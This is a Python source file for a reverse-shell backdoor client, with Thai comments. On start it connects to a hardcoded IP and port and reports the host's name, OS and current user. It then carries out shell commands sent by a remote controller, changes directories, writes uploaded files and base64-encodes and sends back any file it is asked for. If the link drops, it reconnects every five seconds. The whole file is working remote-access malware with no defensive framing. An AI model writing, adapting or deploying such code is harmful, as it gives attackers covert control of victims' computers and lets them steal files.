#!/usr/bin/python

import socket
import platform
import getpass
import json
import sys
import subprocess
import time
import os
import base64


class BD:
    def __init__(self, ip, port):
        
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

        # ส่งข้อมูลเครื่องไปยัง sv(server)
        system_info = {
            'hostname': socket.gethostname(),
            'os': platform.system() + " " + platform.release(),
            'user': getpass.getuser(),
        }
        self.connect_send(system_info)

        response = self.connect_receive()
        self.session_token = response.get('token')
        self.connect_send(self.session_token)

    def execute_sys_cmd(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            try:
                return output.decode('utf-8')
            except UnicodeDecodeError:
                return output.decode('cp1252', errors='replace')
        except subprocess.CalledProcessError as e:
            return f"[-] Error executing command: {str(e)}"

    def connect_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def connect_receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory_to(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed working directory to: {os.getcwd()}"
        except Exception as e:
            return f"[-] Change directory error: {str(e)}"
        
    
    def download_file(self, path):
        try:
            # มีการตรวจสอบนามสกุลไฟล์
            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                # สำหรับไฟล์รูปภาพ ใช้ binary mode
                with open(path, "rb") as file:
                    image_data = file.read()
                return base64.b64encode(image_data).decode()
            else:
                # สำหรับไฟล์ทั่วไป
                with open(path, "rb") as file:
                    return base64.b64encode(file.read()).decode()
        except Exception as e:
            return f"[-] Read file error: {str(e)}"

    def up_file(self, path, content):
        try:
            # มีการตรวจสอบนามสกุลไฟล์
            if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                # สำหรับไฟล์รูปภาพ ใช้ binary mode
                with open(path, "wb") as file:
                    file.write(base64.b64decode(content))
            else:
                # สำหรับไฟล์ทั่วไป
                with open(path, "wb") as file:
                    file.write(base64.b64decode(content))
            return "[+] Upload successful"
        except Exception as e:
            return f"[-] Write file error: {str(e)}"

    def run_cmd(self):
        while True:
            try:
                cmd = self.connect_receive()
            

                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_result = self.change_directory_to(cmd[1])

                elif cmd[0] == "upload" and len(cmd) > 2:
                    cmd_result = self.up_file(cmd[1], cmd[2])

                elif cmd[0] == "download" and len(cmd) > 1:
                    cmd_result = self.download_file(cmd[1])
                
                else:
                    cmd_result = self.execute_sys_cmd(cmd)

                self.connect_send(cmd_result)

            except Exception as e:
                try:
                    self.connect_send(f"[-] Error during command execution: {str(e)}")
                except:
                    break

if __name__ == "__main__":
    try:
        while True:
            try:
                server_bd = BD("192.168.1.135", 5555)
                server_bd.run_cmd()
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                time.sleep(5)  # รอ 5 วินาทีก่อนลองเชื่อม Server ใหม่
    except KeyboardInterrupt:
        sys.exit()


    